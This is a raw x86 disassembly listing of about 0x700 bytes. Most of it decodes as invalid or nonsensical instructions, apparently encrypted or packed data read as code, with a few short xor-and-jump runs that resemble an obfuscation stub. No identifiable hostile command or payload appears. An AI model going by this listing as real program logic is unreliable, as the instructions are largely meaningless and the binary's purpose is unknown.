  40b703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b704:	cmp    eax,0x6a225c6b
  40b709:	cmp    ch,BYTE PTR ds:0x252df037
  40b70f:	cmp    al,dh
  40b711:	cmc    
  40b712:	shr    DWORD PTR [eax],cl
  40b714:	in     eax,dx
  40b715:	adc    BYTE PTR [ebp-0x21e73ce7],al
  40b71b:	jmp    0x40b750
  40b71d:	mov    ch,BYTE PTR [ebx-0x6af5b378]
  40b723:	sub    eax,0xfcb6df94
  40b728:	jne    0x40b6c9
  40b72a:	mov    cl,ah
  40b72c:	mov    cl,0xad
  40b72e:	(bad)  
  40b72f:	stos   DWORD PTR es:[edi],eax
  40b730:	cdq    
  40b731:	pop    edi
  40b732:	ficom  WORD PTR [ecx]
  40b735:	retf   
  40b736:	jmp    0x40b74d
  40b738:	lods   al,BYTE PTR ds:[esi]
  40b739:	dec    ebp
  40b73a:	loopne 0x40b7b7
  40b73c:	bound  edi,QWORD PTR [ebx+edx*1-0x55]
  40b740:	xor    DWORD PTR ds:0xbed9a931,ebx
  40b746:	cli    
  40b747:	rcl    DWORD PTR [esi],0xd8
  40b74a:	sbb    al,0xd6
  40b74c:	test   al,0x3d
  40b74e:	rcl    edx,cl
  40b750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b751:	push   es
  40b752:	push   ebp
  40b753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b754:	sahf   
  40b755:	mov    eax,0x8aa2df2c
  40b75a:	jnp    0x40b770
  40b75c:	cmp    eax,0x7b79c0b1
  40b761:	mov    dh,0x4
  40b763:	push   ebx
  40b764:	pop    ds
  40b765:	add    DWORD PTR [ecx],ebp
  40b767:	push   esp
  40b768:	sahf   
  40b769:	stc    
  40b76a:	and    al,0x8
  40b76c:	(bad)  ds:[edi+0x5]
  40b770:	rcr    DWORD PTR [esp+ecx*8-0x59],cl
  40b774:	cmc    
  40b775:	xchg   esi,eax
  40b776:	in     eax,0x34
  40b778:	sbb    cl,ah
  40b77a:	js     0x40b797
  40b77c:	dec    ebp
  40b77d:	sub    eax,0xbf09e77
  40b782:	(bad)  
  40b783:	sub    dh,dl
  40b785:	push   edi
  40b786:	adc    BYTE PTR [edi+0x5fc8da1],ch
  40b78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78d:	sub    dh,dl
  40b78f:	into   
  40b790:	aad    0xdc
  40b792:	sti    
  40b793:	push   ecx
  40b794:	mov    esi,?
  40b796:	dec    edx
  40b797:	jbe    0x40b7b1
  40b799:	xchg   esp,eax
  40b79a:	or     BYTE PTR [edi-0x68f79178],0x10
  40b7a1:	pop    esp
  40b7a2:	sahf   
  40b7a3:	jns    0x40b7c0
  40b7a5:	shr    BYTE PTR [ecx+0x5a],1
  40b7a8:	in     eax,0xea
  40b7aa:	stos   BYTE PTR es:[edi],al
  40b7ab:	add    al,0xac
  40b7ad:	mov    al,0x17
  40b7af:	inc    edi
  40b7b0:	daa    
  40b7b1:	sbb    ebp,DWORD PTR [ebx]
  40b7b3:	jp     0x40b760
  40b7b5:	mov    esp,DWORD PTR [edi+0x47]
  40b7b8:	pushf  
  40b7b9:	inc    ecx
  40b7ba:	(bad)  
  40b7bb:	in     al,dx
  40b7bc:	cdq    
  40b7bd:	loop   0x40b7f9
  40b7bf:	cld    
  40b7c0:	inc    edx
  40b7c1:	inc    edi
  40b7c2:	jmp    0x7ff:0x5aa585f2
  40b7c9:	sub    esp,DWORD PTR [edx]
  40b7cb:	or     al,0x8f
  40b7cd:	push   esp
  40b7ce:	repz cmp al,0x20
  40b7d1:	dec    esi
  40b7d2:	push   0xbc724aad
  40b7d7:	xor    DWORD PTR [ebx+0xdbc4ef4],edx
  40b7dd:	add    esp,DWORD PTR ds:0xfa059192
  40b7e3:	dec    edi
  40b7e4:	mov    ebp,0x12819f2f
  40b7e9:	sub    ebx,DWORD PTR ds:0x964b2ce9
  40b7ef:	sbb    dl,BYTE PTR [ebp-0x51]
  40b7f2:	fs das 
  40b7f4:	mov    ds:0xf6497812,al
  40b7f9:	leave  
  40b7fa:	sbb    bl,BYTE PTR [esi-0x14]
  40b7fd:	js     0x40b7a0
  40b7ff:	repnz sub esp,DWORD PTR [edi+0x32]
  40b803:	aaa    
  40b804:	rcr    DWORD PTR [edi+0x7a3599a7],cl
  40b80a:	enter  0xbeb9,0xb4
  40b80e:	ds out 0x89,al
  40b811:	push   ebx
  40b812:	(bad)  
  40b813:	dec    edi
  40b814:	(bad)  
  40b815:	data16 das 
  40b817:	jecxz  0x40b847
  40b819:	lahf   
  40b81a:	cmp    eax,0xdc663f0e
  40b81f:	in     al,dx
  40b820:	sub    DWORD PTR [ebx-0x71],ebp
  40b823:	std    
  40b824:	jl     0x40b7e5
  40b826:	into   
  40b827:	sub    eax,0xa62aa4c8
  40b82c:	test   BYTE PTR ds:0xa0b2db35,ch
  40b832:	mov    ch,0xf4
  40b834:	pushf  
  40b835:	cmp    BYTE PTR [edx-0x3],dh
  40b838:	je     0x40b834
  40b83a:	neg    BYTE PTR [ecx]
  40b83c:	mov    al,es:0x2038fd67
  40b842:	loopne 0x40b805
  40b844:	and    eax,ebx
  40b846:	or     BYTE PTR [ecx-0x2d1e4af5],0xa7
  40b84d:	rcl    dh,cl
  40b84f:	rol    DWORD PTR [eax-0x58d99bf0],0xdf
  40b856:	not    esp
  40b858:	dec    esp
  40b859:	mov    edx,0x1caf069f
  40b85e:	fild   WORD PTR [ebx+0x2fa62704]
  40b864:	and    eax,0x64e6cd4e
  40b869:	inc    ecx
  40b86a:	(bad)  
  40b86b:	xor    bl,BYTE PTR [eax]
  40b86d:	shl    BYTE PTR [ecx+edi*2-0x74],cl
  40b871:	or     edi,ebx
  40b873:	inc    eax
  40b874:	sub    BYTE PTR [esi+0x75],ch
  40b877:	fdiv   st,st(0)
  40b879:	pusha  
  40b87a:	mov    ebp,0x616a2ec9
  40b87f:	or     BYTE PTR [esp+edx*8+0x18],dh
  40b883:	in     al,0xc4
  40b885:	jno    0x40b865
  40b887:	ds aas 
  40b889:	mov    ah,0x4
  40b88b:	add    esp,DWORD PTR [ecx+0x31]
  40b88e:	jmp    0x40b857
  40b890:	bound  ecx,QWORD PTR ds:[esi]
  40b893:	(bad)  
  40b894:	xor    ch,BYTE PTR [ebx]
  40b896:	stos   BYTE PTR es:[edi],al
  40b897:	or     DWORD PTR [edx+0x3a],ebp
  40b89a:	ret    0x6c03
  40b89d:	jnp    0x40b82d
  40b89f:	loopne 0x40b838
  40b8a1:	mov    al,ds:0x99de7db7
  40b8a6:	cmp    DWORD PTR [edi],edi
  40b8a8:	ins    DWORD PTR es:[edi],dx
  40b8a9:	enter  0xb2d1,0xcb
  40b8ad:	jne    0x40b87e
  40b8af:	cdq    
  40b8b0:	pop    ebp
  40b8b1:	(bad)  
  40b8b2:	bound  eax,QWORD PTR [ebx]
  40b8b4:	jne    0x40b839
  40b8b6:	dec    ecx
  40b8b7:	add    al,0xf3
  40b8b9:	popa   
  40b8ba:	mov    al,0x54
  40b8bc:	jecxz  0x40b92a
  40b8be:	jno    0x40b861
  40b8c0:	ins    BYTE PTR es:[edi],dx
  40b8c1:	or     DWORD PTR [edi-0x74842dbe],esi
  40b8c7:	test   al,0x21
  40b8c9:	dec    esi
  40b8cb:	mov    cl,0xe5
  40b8cd:	cld    
  40b8ce:	adc    ch,bl
  40b8d0:	enter  0xc892,0x84
  40b8d4:	xchg   ebp,eax
  40b8d5:	push   ecx
  40b8d6:	inc    esp
  40b8d7:	ins    WORD PTR es:[edi],dx
  40b8d9:	cmp    bh,BYTE PTR [eax+eiz*2-0x33]
  40b8dd:	push   ebx
  40b8de:	jne    0x40b94d
  40b8e0:	addr16 in eax,0x18
  40b8e3:	mov    ch,0xfa
  40b8e5:	adc    esi,DWORD PTR [edx-0x67]
  40b8e8:	in     eax,dx
  40b8e9:	nop
  40b8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8eb:	lods   eax,DWORD PTR ds:[esi]
  40b8ec:	mov    edi,0xe21b3f9d
  40b8f1:	scas   al,BYTE PTR es:[edi]
  40b8f2:	pop    edx
  40b8f3:	outs   dx,DWORD PTR ds:[esi]
  40b8f4:	add    BYTE PTR [edi+0x72],ah
  40b8f7:	inc    eax
  40b8f8:	into   
  40b8f9:	(bad)  
  40b8fa:	pop    edx
  40b8fb:	xchg   edx,eax
  40b8fc:	in     eax,0xc5
  40b8fe:	push   esp
  40b8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b900:	mov    eax,0xe198e39c
  40b905:	add    eax,0x5014fdf2
  40b90a:	mov    dl,bl
  40b90c:	adc    DWORD PTR [ecx],ebx
  40b90e:	jnp    0x40b962
  40b910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b911:	pop    ebp
  40b912:	ret    0x66e7
  40b915:	lahf   
  40b916:	ficom  DWORD PTR [edi-0x3746e949]
  40b91c:	cli    
  40b91d:	push   0xe4f34e08
  40b922:	xlat   BYTE PTR ds:[ebx]
  40b923:	es ret 0xeba0
  40b927:	enter  0x7672,0x11
  40b92b:	cmp    edx,eax
  40b92d:	cmc    
  40b92e:	mov    al,0x86
  40b930:	iret   
  40b931:	inc    edx
  40b932:	shl    al,1
  40b934:	fdivr  DWORD PTR [ebx+0x61eb3a08]
  40b93a:	jg     0x40b96f
  40b93c:	fist   DWORD PTR [edi+0x66c75b7a]
  40b942:	pushf  
  40b943:	sub    ecx,DWORD PTR [esi]
  40b945:	rcr    BYTE PTR [edi+ecx*4+0x27],1
  40b949:	pop    ss
  40b94a:	jns    0x40b8e3
  40b94c:	jle    0x40b9b0
  40b94e:	sahf   
  40b94f:	int    0xa
  40b951:	and    BYTE PTR [ebx],bh
  40b953:	das    
  40b954:	loopne 0x40b9a7
  40b956:	jmp    0x40b94e
  40b958:	pop    edi
  40b959:	test   BYTE PTR [ebx],bl
  40b95b:	(bad)  
  40b95c:	adc    al,0x58
  40b95e:	jp     0x40b9a2
  40b960:	das    
  40b961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b962:	in     al,dx
  40b963:	jnp    0x40b9e0
  40b965:	lods   eax,DWORD PTR ds:[esi]
  40b966:	aad    0x56
  40b968:	cli    
  40b969:	in     al,0xb
  40b96b:	cs addr16 hlt 
  40b96e:	into   
  40b96f:	aam    0xca
  40b971:	jmpw   0x6e9c
  40b975:	test   BYTE PTR [esi+edi*8],al
  40b978:	jo     0x40b9c9
  40b97a:	es mov ebp,0xa4ec74d4
  40b980:	mov    ebp,0xa2c00dee
  40b985:	fmul   DWORD PTR [esp+esi*8-0x777a4e70]
  40b98c:	add    DWORD PTR [esi-0x4a5a707f],0xed8215d5
  40b996:	sub    dh,al
  40b998:	in     al,0x6b
  40b99a:	retf   0xc0ba
  40b99d:	ds enter 0x2f63,0x10
  40b9a2:	xchg   ebp,eax
  40b9a3:	dec    esp
  40b9a4:	std    
  40b9a5:	cmp    BYTE PTR [edi],al
  40b9a7:	dec    ecx
  40b9a8:	dec    ebx
  40b9a9:	retf   0xae02
  40b9ac:	out    0xeb,eax
  40b9ae:	push   edi
  40b9af:	mov    al,0x7a
  40b9b1:	pop    ebx
  40b9b2:	(bad)  
  40b9b3:	dec    ecx
  40b9b4:	in     eax,0x38
  40b9b6:	dec    edx
  40b9b7:	jmp    0x40b93d
  40b9b9:	and    dh,BYTE PTR [ebp-0x5d]
  40b9bc:	xor    al,0x35
  40b9be:	inc    edx
  40b9c0:	add    al,0xfd
  40b9c2:	call   0x9bd:0x91211719
  40b9c9:	jp     0x40b9bb
  40b9cb:	cdq    
  40b9cc:	or     bl,0xbd
  40b9cf:	leave  
  40b9d0:	in     al,dx
  40b9d1:	mov    bh,0x8a
  40b9d3:	add    dh,BYTE PTR [ebp-0x46]
  40b9d6:	add    bh,al
  40b9d8:	or     eax,0x292585c
  40b9dd:	jae    0x40b986
  40b9df:	pusha  
  40b9e0:	push   esp
  40b9e2:	cdq    
  40b9e3:	inc    esp
  40b9e4:	icebp  
  40b9e5:	pop    ds
  40b9e6:	pop    es
  40b9e7:	test   al,dl
  40b9e9:	int    0x11
  40b9eb:	sbb    al,0x97
  40b9ed:	mov    edx,0xb5921c18
  40b9f2:	push   ds
  40b9f3:	push   esi
  40b9f4:	shl    BYTE PTR [ecx-0x4e],1
  40b9f7:	mov    esi,ecx
  40b9f9:	ja     0x40b9dd
  40b9fb:	jmp    0x40b9ef
  40b9fd:	mov    al,ds:0x987d93ac
  40ba02:	adc    dh,BYTE PTR [ebp-0x35]
  40ba05:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40ba07:	cwde   
  40ba08:	pop    ds
  40ba09:	(bad)  
  40ba0a:	xor    ah,BYTE PTR [ebp-0x73a7306c]
  40ba10:	xchg   esi,eax
  40ba11:	pop    eax
  40ba12:	or     cl,dh
  40ba14:	sti    
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	std    
  40ba36:	jo     0x40b9d3
  40ba38:	mov    cx,si
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba25
  40ba42:	push   ecx
  40ba43:	inc    esp
  40ba44:	pushw  ss
  40ba46:	mov    gs,WORD PTR [edx+eiz*1+0x50]
  40ba4a:	mov    ebx,0x3f7a833
  40ba4f:	shr    DWORD PTR [ecx+0x21],cl
  40ba52:	or     eax,0x2a27b5e3
  40ba57:	mov    edx,0xda901c77
  40ba5c:	mov    BYTE PTR [ebx],ch
  40ba5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba5f:	mov    ?,WORD PTR [edi+0x47]
  40ba62:	ins    BYTE PTR es:[edi],dx
  40ba63:	mov    al,0x41
  40ba65:	jae    0x40ba69
  40ba67:	gs push ebp
  40ba69:	stc    
  40ba6a:	cwde   
  40ba6b:	addr16 jnp 0x40ba2e
  40ba6e:	xchg   ecx,eax
  40ba6f:	pop    es
  40ba70:	mov    ecx,0x6cca50f3
  40ba75:	add    edi,DWORD PTR [edi+0x510264ed]
  40ba7b:	fst    QWORD PTR [edi-0x41]
  40ba7e:	inc    esp
  40ba7f:	test   DWORD PTR [edi],ebp
  40ba81:	pop    ebx
  40ba82:	pop    ebp
  40ba83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba84:	imul   eax,DWORD PTR [ecx],0xe0ae96e0
  40ba8a:	dec    ebx
  40ba8b:	(bad)  
  40ba8c:	mov    DWORD PTR [edi+ecx*1],ebx
  40ba8f:	imul   esi,DWORD PTR [esi+0x1c8c6164],0xae463b6b
  40ba99:	loopne 0x40bac9
  40ba9b:	and    cl,bh
  40ba9d:	mov    ebx,0x48b22763
  40baa2:	xchg   esi,eax
  40baa3:	mov    esi,edi
  40baa5:	popf   
  40baa6:	gs nop
  40baa8:	and    ecx,DWORD PTR [ebp+0x6a]
  40baab:	imul   edx,DWORD PTR [eax],0xffffffbb
  40baae:	and    al,0xce
  40bab0:	adc    edi,DWORD PTR [esi]
  40bab2:	dec    ecx
  40bab3:	lods   eax,DWORD PTR ds:[esi]
  40bab4:	ins    DWORD PTR es:[edi],dx
  40bab5:	sbb    DWORD PTR [ecx+0x2e],ebx
  40bab8:	les    edi,FWORD PTR [edi]
  40baba:	fs dec eax
  40babc:	cmp    DWORD PTR ds:0x1d0c93cd,eax
  40bac2:	pop    ebp
  40bac3:	and    eax,DWORD PTR [edi]
  40bac5:	cdq    
  40bac6:	mov    bh,0xc0
  40bac8:	shl    ebp,0x9e
  40bacb:	mov    esp,0x4c820bb8
  40bad0:	xor    al,0xa5
  40bad2:	sbb    bh,BYTE PTR [eax-0x10]
  40bad5:	push   0xffffff8a
  40bad7:	mov    ds:0x571f58f2,al
  40badc:	and    al,0xfa
  40bade:	mov    BYTE PTR [ebx+0x250b1f33],al
  40bae4:	add    al,0xfa
  40bae6:	inc    ebp
  40bae7:	(bad)  
  40bae8:	jge    0x40ba70
  40baea:	cmp    al,0x7c
  40baec:	retf   
  40baed:	fst    st(3)
  40baef:	clc    
  40baf0:	(bad)  
  40baf1:	pop    ebx
  40baf2:	test   al,0x58
  40baf4:	mov    bl,0xd0
  40baf6:	mov    sp,0xc421
  40bafa:	getsec 
  40bafc:	and    ebp,DWORD PTR [ebp+0x62]
  40baff:	sub    eax,0x613dbe3f
  40bb04:	sub    BYTE PTR [edi+0x1a3593b1],al
  40bb0a:	add    ch,BYTE PTR [ecx-0x40da5093]
  40bb10:	xor    al,BYTE PTR [eax+0x13f2ff38]
  40bb16:	(bad)  
  40bb17:	cmp    DWORD PTR [eax-0x4075a310],esi
  40bb1d:	cmp    bh,cl
  40bb1f:	ins    DWORD PTR es:[edi],dx
  40bb20:	dec    edi
  40bb21:	fidivr DWORD PTR [edx]
  40bb23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb24:	and    edi,DWORD PTR [eax+0xedb0de7]
  40bb2a:	les    edx,FWORD PTR [ebp+0x18]
  40bb2d:	dec    edx
  40bb2e:	loopne 0x40bae4
  40bb30:	or     bh,BYTE PTR [edx+0x14]
  40bb33:	mov    dh,0x4b
  40bb35:	ds sbb al,0xc4
  40bb38:	pop    ds
  40bb39:	int3   
  40bb3a:	imul   ebp,DWORD PTR [esi+0x1444d931],0x12f44f70
  40bb44:	adc    eax,0xa9ef9997
  40bb49:	xor    BYTE PTR [esi],dl
  40bb4b:	push   edi
  40bb4c:	sub    eax,esi
  40bb4e:	or     BYTE PTR [ecx-0x5e],al
  40bb51:	fld    TBYTE PTR [ebx+esi*8-0x51]
  40bb55:	fst    QWORD PTR [ebp*2+0x3a5820ed]
  40bb5c:	push   es
  40bb5d:	retf   0x6123
  40bb60:	jnp    0x40bb56
  40bb62:	(bad)  
  40bb64:	data16 sti 
  40bb66:	inc    ebp
  40bb67:	arpl   sp,si
  40bb69:	push   edi
  40bb6a:	sbb    DWORD PTR [eax+0x17],esp
  40bb6d:	aas    
  40bb6e:	dec    ecx
  40bb6f:	sbb    edx,DWORD PTR [esi]
  40bb71:	add    DWORD PTR ds:0x73d1f248,0x85656c39
  40bb7b:	push   ebp
  40bb7c:	in     eax,0x1d
  40bb7e:	xor    eax,0xe746f53f
  40bb83:	popa   
  40bb84:	cmp    dh,BYTE PTR [eax+0x7c]
  40bb87:	xor    al,0x65
  40bb89:	aad    0x9
  40bb8b:	mov    cl,0xf8
  40bb8d:	xor    eax,DWORD PTR [edi+0x42]
  40bb90:	aam    0x4f
  40bb92:	jg     0x40bbd4
  40bb94:	cld    
  40bb95:	xor    al,0x20
  40bb97:	mov    dl,0x10
  40bb99:	cdq    
  40bb9a:	jmp    0x40bbcf
  40bb9c:	loopne 0x40bc01
  40bb9e:	mov    cl,0xc5
  40bba0:	and    eax,DWORD PTR [ebx]
  40bba2:	out    dx,al
  40bba3:	adc    eax,esp
  40bba5:	lods   eax,DWORD PTR ds:[esi]
  40bba6:	es test al,0x24
  40bba9:	mov    cl,0x1
  40bbab:	int    0x34
  40bbad:	inc    ebx
  40bbae:	xchg   DWORD PTR [ebx],edx
  40bbb0:	lods   eax,DWORD PTR ds:[esi]
  40bbb1:	scas   eax,DWORD PTR es:[edi]
  40bbb2:	and    BYTE PTR ds:0xd2d0dfaa,al
  40bbb8:	jbe    0x40bbef
  40bbba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbbb:	mov    ch,0x5a
  40bbbd:	aas    
  40bbbe:	pop    esi
  40bbbf:	mov    DWORD PTR gs:[esi-0x2b],ebx
  40bbc3:	xchg   esp,eax
  40bbc4:	inc    esi
  40bbc5:	inc    esp
  40bbc6:	xor    DWORD PTR es:[ebp+0x53],edi
  40bbca:	sub    eax,0x2cd4afda
  40bbcf:	sub    edx,DWORD PTR [ecx+0x65cba143]
  40bbd5:	in     al,0xd7
  40bbd7:	ficomp WORD PTR [ecx]
  40bbd9:	mov    BYTE PTR [ecx-0x29969b50],al
  40bbdf:	jp     0x40bc23
  40bbe1:	popf   
  40bbe2:	push   eax
  40bbe3:	inc    edi
  40bbe4:	xchg   BYTE PTR [ebx-0x1d9a92b2],dh
  40bbea:	push   eax
  40bbeb:	mov    ebp,0x1ce13925
  40bbf0:	iret   
  40bbf1:	loopne 0x40bc50
  40bbf3:	bound  eax,QWORD PTR [ecx+0x3c]
  40bbf6:	sub    DWORD PTR [esi],ebp
  40bbf8:	test   al,0xbd
  40bbfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbfb:	jge    0x40bbb1
  40bbfd:	xchg   ecx,eax
  40bbfe:	xchg   ecx,eax
  40bbff:	inc    edi
  40bc00:	xor    BYTE PTR [ebx],ch
  40bc02:	(bad)  
  40bc03:	fwait
  40bc04:	jo     0x40bbf7
  40bc06:	fld    QWORD PTR [ebx]
  40bc08:	sub    al,0xe
  40bc0a:	mov    ds:0x5f4b7c12,eax
  40bc0f:	mov    bl,ch
  40bc11:	inc    edi
  40bc12:	fmul   QWORD PTR [ebp+0x1f]
  40bc15:	bound  esp,QWORD PTR [ebp+0x5bcc9b9a]
  40bc1b:	push   edi
  40bc1c:	pop    esi
  40bc1d:	lock fs jae 0x40bc92
  40bc21:	inc    eax
  40bc22:	cld    
  40bc23:	xchg   ebx,eax
  40bc24:	xchg   edi,eax
  40bc25:	in     eax,dx
  40bc26:	xor    al,0x73
  40bc28:	dec    eax
  40bc29:	add    eax,0x3fae9cb2
  40bc2e:	loop   0x40bc2b
  40bc30:	pop    ebx
  40bc31:	repnz or dl,dh
  40bc34:	and    DWORD PTR [esi+0x5d],0x1cd25861
  40bc3b:	test   eax,0x7b0545da
  40bc40:	int3   
  40bc41:	pop    ss
  40bc42:	jnp    0x40bc8e
  40bc44:	ins    BYTE PTR es:[edi],dx
  40bc45:	and    DWORD PTR [eax-0x56d41d74],edi
  40bc4b:	mov    al,ds:0xdc4e1cb
  40bc50:	and    DWORD PTR [ecx],ecx
  40bc52:	jg     0x40bbe2
  40bc54:	enter  0xd9e7,0xad
  40bc58:	imul   esp,DWORD PTR [esi-0x79],0xe39a7c1d
  40bc5f:	xlat   BYTE PTR ds:[ebx]
  40bc60:	push   esp
  40bc61:	jg     0x40bc75
  40bc63:	mov    al,0x8f
  40bc65:	nop
  40bc66:	cmp    esi,DWORD PTR [esi-0x2e]
  40bc69:	sbb    DWORD PTR [edx-0x6f],0xffffff9b
  40bc6d:	rol    DWORD PTR [ecx+0x68cede2f],0x57
  40bc74:	push   es
  40bc75:	scas   eax,DWORD PTR es:[edi]
  40bc76:	fcmovb st,st(2)
  40bc78:	fimul  WORD PTR [ecx+ecx*4-0x60]
  40bc7c:	(bad)  
  40bc7d:	fstp   DWORD PTR [ebx]
  40bc7f:	and    DWORD PTR [ebp-0x48],eax
  40bc82:	add    ch,BYTE PTR [esi+ebp*2+0x43]
  40bc86:	leave  
  40bc87:	push   ss
  40bc88:	jmp    0xab82:0x28661554
  40bc8f:	mov    edx,DWORD PTR [eax-0x23b9c72d]
  40bc95:	jns    0x40bd08
  40bc97:	add    BYTE PTR [ebx+edi*4+0x8],dh
  40bc9b:	push   ss
  40bc9c:	inc    edx
  40bc9d:	lea    ebp,[eax-0x68]
  40bca0:	pushf  
  40bca1:	mov    eax,ds:0x56a8abe4
  40bca6:	sahf   
  40bca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bca8:	mov    dh,0x2d
  40bcaa:	mov    ch,BYTE PTR [edi-0x55]
  40bcad:	sahf   
  40bcae:	and    eax,0x2bd9ccd9
  40bcb3:	inc    DWORD PTR [edi-0x479b197b]
  40bcb9:	xchg   dh,al
  40bcbb:	xor    al,0x5
  40bcbd:	dec    edx
  40bcbe:	fmul   DWORD PTR [eax+0x75]
  40bcc1:	ins    DWORD PTR es:[edi],dx
  40bcc2:	jmp    0xdb75025c
  40bcc7:	popa   
  40bcc8:	mov    al,0x41
  40bcca:	sbb    esp,ebp
  40bccc:	lods   eax,DWORD PTR ds:[esi]
  40bccd:	jne    0x40bc81
  40bccf:	in     eax,0x3e
  40bcd1:	adc    bl,BYTE PTR [ebp-0x5c]
  40bcd4:	gs cmp al,0x5c
  40bcd7:	clc    
  40bcd8:	aas    
  40bcd9:	xchg   ecx,eax
  40bcda:	sbb    eax,0xdeb821e
  40bcdf:	retf   
  40bce0:	mov    bh,0x2d
  40bce2:	xchg   eax,eax
  40bce4:	(bad)  
  40bce5:	loope  0x40bcc2
  40bce7:	mov    ch,0x50
  40bce9:	mov    BYTE PTR [ebx],ah
  40bceb:	clc    
  40bcec:	or     al,0xe4
  40bcee:	jmp    0x40bd02
  40bcf0:	mov    ds:0x8c82facd,al
  40bcf5:	jnp    0x40bd51
  40bcf7:	jecxz  0x40bd62
  40bcf9:	nop
  40bcfa:	leave  
  40bcfb:	in     eax,0xb5
  40bcfd:	es dec edx
  40bcff:	idiv   DWORD PTR [edx]
  40bd01:	shl    BYTE PTR [ecx-0xc],1
  40bd04:	mov    edx,DWORD PTR ds:0x86d98a4a
  40bd0a:	mov    WORD PTR [edx],?
  40bd0c:	xchg   edi,eax
  40bd0d:	hlt    
  40bd0e:	fsub   DWORD PTR [edx]
  40bd10:	scas   eax,DWORD PTR es:[edi]
  40bd11:	pop    ds
  40bd12:	mov    esp,0xfaad40d7
  40bd17:	push   ss
  40bd18:	cmp    eax,0x589ceb60
  40bd1d:	scas   al,BYTE PTR es:[edi]
  40bd1e:	xor    al,0x99
  40bd20:	repz inc esp
  40bd22:	sub    BYTE PTR [ecx+0x62c90cb9],bh
  40bd28:	sub    BYTE PTR [esi+0x57785abb],dh
  40bd2e:	xchg   esi,eax
  40bd2f:	sub    dl,BYTE PTR ds:0xed0c5a4
  40bd35:	ror    bh,1
  40bd37:	sub    bh,BYTE PTR ds:[edx]
  40bd3a:	std    
  40bd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd3c:	push   esi
  40bd3d:	xchg   esi,eax
  40bd3e:	pop    ecx
  40bd3f:	jmp    0xcec64e6a
  40bd44:	xor    eax,0x22b975e
  40bd49:	mov    dh,0xd6
  40bd4b:	imul   ebp,DWORD PTR [ebp+ebp*2-0x64],0xfffffffc
  40bd50:	lods   al,BYTE PTR ds:[esi]
  40bd51:	pop    edx
  40bd52:	xor    al,0xf6
  40bd54:	xor    DWORD PTR [ebx-0x56],0x6cd5a24d
  40bd5b:	arpl   WORD PTR [ebp+edx*8-0x4f5b40a9],cx
  40bd62:	sti    
  40bd63:	push   es
  40bd64:	fadd   DWORD PTR [ebp+edx*2+0x5e]
  40bd68:	cs sahf 
  40bd6a:	(bad)  
  40bd6b:	jmp    FWORD PTR [ecx-0x6fa4f189]
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz adc BYTE PTR [edi-0x6c],bh
  40bd8e:	jne    0x40bd49
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bddc
  40bd98:	stos   BYTE PTR es:[edi],al
  40bd99:	dec    edx
  40bd9a:	pop    ss
  40bd9b:	gs jb  0x40bdf8
  40bd9e:	call   0xb50a4bf5
  40bda3:	out    0x6a,eax
  40bda5:	sbb    eax,0xca827394
  40bdaa:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40bdac:	inc    esi
  40bdad:	pusha  
  40bdae:	iret   
  40bdaf:	mov    bh,0x80
  40bdb1:	aas    
  40bdb2:	scas   al,BYTE PTR es:[edi]
  40bdb3:	int3   
  40bdb4:	jne    0x40bd86
  40bdb6:	push   0x5c
  40bdb8:	mov    dl,0x51
  40bdba:	pop    esi
  40bdbb:	jg     0x40bda3
  40bdbd:	loope  0x40be1a
  40bdbf:	xchg   esp,eax
  40bdc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc1:	pop    esp
  40bdc2:	fwait
  40bdc3:	cmp    al,0xe1
  40bdc5:	arpl   WORD PTR [ecx+0x39286547],bp
  40bdcb:	call   FWORD PTR [ecx-0x7]
  40bdce:	into   
  40bdcf:	mov    cl,0xe6
  40bdd1:	jg     0x40bd9f
  40bdd3:	arpl   WORD PTR [esi-0x80],dx
  40bdd6:	xor    eax,0x228766d0
  40bddb:	jbe    0x40be47
  40bddd:	and    eax,0xecef555f
  40bde2:	mov    ah,BYTE PTR [ebx+0x25656e28]
  40bde8:	loop   0x40be4f
  40bdea:	pushf  
  40bdeb:	mov    ch,0x43
  40bded:	or     edi,DWORD PTR [ebx-0x41]
  40bdf0:	and    al,BYTE PTR [ebx]
  40bdf2:	sbb    DWORD PTR [esi-0x1f],0x49
  40bdf6:	test   DWORD PTR [esi],0xf50ce45a
  40bdfc:	std    
  40bdfd:	xchg   edx,eax
  40bdfe:	mov    gs,WORD PTR [edi+0x53]
